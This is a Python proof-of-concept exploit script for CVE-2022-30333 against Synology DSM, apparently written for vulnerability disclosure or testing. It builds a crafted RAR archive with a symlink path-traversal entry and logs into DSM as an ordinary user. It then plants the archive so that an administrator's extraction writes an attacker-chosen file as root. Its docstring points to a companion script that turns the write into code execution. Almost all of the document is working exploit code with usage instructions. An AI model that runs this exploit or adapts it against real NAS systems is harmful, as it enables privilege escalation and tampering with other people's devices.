#!/usr/bin/env python3
r"""
Synology DSM arbitrary file write as root via a malicious RAR extracted by an admin
(CVE-2022-30333).

File Station's SYNO.FileStation.Extract unpacks with the caller's effective uid: root for
an administrator, the caller's own uid for a normal user. DSM bundles UnRAR 5.70, which
predates the CVE-2022-30333 fix, so a RAR entry that is a Windows symlink escapes the
extraction folder and a second entry writes through it. When an ADMINISTRATOR extracts the
crafted archive, that write lands at an attacker-chosen absolute path AS ROOT. A normal
user plants the archive; the admin's extraction performs the privileged write.
Classification: 1-click, normal-user-auth arbitrary file write as root (AC:H); poc_rce.py
turns it into code execution.

  python3 poc_arb_file_write.py --url https://nas:5001 --user alice --password 'Passw0rd!' \
      --dest /share --file ./hello.txt --target /etc/hello.txt

--dest is a folder the normal account can write and an admin can browse. --file is the
local file to plant; --target is the absolute path it is written to (must be on a writable
filesystem, e.g. /etc, not the read-only /usr).

WARNING: extraction re-owns the target file's parent directory to the extracting account,
so e.g. /etc goes from root:root to admin:users. Restore it with
`chown root:root /etc; chmod 0755 /etc` after testing, or system commands may break.
"""
import argparse
import json
import os
import ssl
import struct
import urllib.parse
import urllib.request
import zlib
from http.cookiejar import CookieJar


# --- minimal RAR5 builder (no external tools) -----------------------------

def vint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def block(htype, hflags, extra_area=b"", data_area=b"", specific=b""):
    body = vint(htype) + vint(hflags)
    if hflags & 0x0001:
        body += vint(len(extra_area))
    if hflags & 0x0002:
        body += vint(len(data_area))
    body += specific + extra_area
    hdr = vint(len(body)) + body
    crc = zlib.crc32(hdr) & 0xffffffff
    return struct.pack("<I", crc) + hdr + data_area


def file_header(name, data=b"", symlink_target=None, mode=0o644):
    name_b = name.encode()
    if symlink_target is not None:
        hostos, attr = 0, 0
    else:
        hostos, attr = 1, 0o100000 | mode          # S_IFREG | mode, Unix attributes
    specific = (vint(0) + vint(len(data)) + vint(attr) + vint(0) + vint(hostos)
                + vint(len(name_b)) + name_b)
    extra = b""
    hflags = 0x0002 if data else 0x0000
    if symlink_target is not None:
        t = symlink_target.encode()
        rec = vint(5) + vint(2) + vint(0) + vint(len(t)) + t   # type 5, WINSYMLINK, target
        extra = vint(len(rec)) + rec
        hflags |= 0x0001
    return block(2, hflags, extra_area=extra, data_area=data, specific=specific)


def build_rar(target, data):
    """A symlink to the target's parent dir (via the traversal), then the file through it.
    The backslash symlink target is the CVE-2022-30333 bug: UnRAR checks it before
    converting the separators, so the '..' escape is not counted."""
    parent = [c for c in os.path.dirname(target).split("/") if c]
    link_target = "\\".join([".."] * 8 + parent)
    sig = b"Rar!\x1a\x07\x01\x00"
    main = block(1, 0, specific=vint(0))
    end = block(5, 0, specific=vint(0))
    link = file_header("l", symlink_target=link_target)
    drop = file_header("l/" + os.path.basename(target), data=data, mode=0o644)
    return sig + main + link + drop + end


# --- DSM client -----------------------------------------------------------

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE


class DSM:
    def __init__(self, url):
        self.base = url.rstrip("/")
        self.sid = None
        self.token = None
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_ctx),
            urllib.request.HTTPCookieProcessor(CookieJar()))

    def _open(self, req):
        with self.opener.open(req, timeout=60) as r:
            return json.loads(r.read())

    def _auth(self):
        p = {}
        if self.sid:
            p["_sid"] = self.sid
        if self.token:
            p["SynoToken"] = self.token
        return p

    def login(self, user, password):
        q = urllib.parse.urlencode({
            "api": "SYNO.API.Auth", "method": "login", "version": "6",
            "account": user, "passwd": password, "format": "sid",
            "enable_syno_token": "yes"})
        d = self._open(urllib.request.Request(self.base + "/webapi/auth.cgi?" + q))
        if not d.get("success"):
            raise SystemExit("login failed: %s" % d)
        self.sid = d["data"]["sid"]
        self.token = d["data"].get("synotoken")
        print("[1] logged in, sid:", self.sid)

    def upload(self, dest_dir, name, blob):
        boundary = "----pocboundary"

        def part(headers, body):
            return ("--%s\r\n%s\r\n\r\n" % (boundary, headers)).encode() + body + b"\r\n"

        body = b""
        for k, v in [("api", "SYNO.FileStation.Upload"), ("version", "2"),
                     ("method", "upload"), ("path", dest_dir),
                     ("create_parents", "true"), ("overwrite", "true")]:
            body += part('Content-Disposition: form-data; name="%s"' % k, v.encode())
        body += part(
            'Content-Disposition: form-data; name="file"; filename="%s"\r\n'
            'Content-Type: application/octet-stream' % name, blob)
        body += ("--%s--\r\n" % boundary).encode()
        url = self.base + "/webapi/entry.cgi?" + urllib.parse.urlencode(self._auth())
        req = urllib.request.Request(url, data=body, headers={
            "Content-Type": "multipart/form-data; boundary=" + boundary})
        print("[2] upload:", self._open(req))


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="https://nas:5001")
    ap.add_argument("--user", required=True, help="a normal DSM account (the attacker)")
    ap.add_argument("--password", required=True)
    ap.add_argument("--dest", default="/home",
                    help="a folder the normal account can write and an admin can browse")
    ap.add_argument("--file", required=True, help="local file to plant")
    ap.add_argument("--target", required=True, help="absolute path to write on the appliance")
    args = ap.parse_args()

    with open(args.file, "rb") as f:
        data = f.read()

    dsm = DSM(args.url)
    dsm.login(args.user, args.password)
    dsm.upload(args.dest, "poc.rar", build_rar(args.target, data))
    archive = args.dest.rstrip("/") + "/poc.rar"
    print("[*] planted %s. When an administrator extracts it in File Station," % archive)
    print("    %s is written as root." % args.target)


if __name__ == "__main__":
    main()
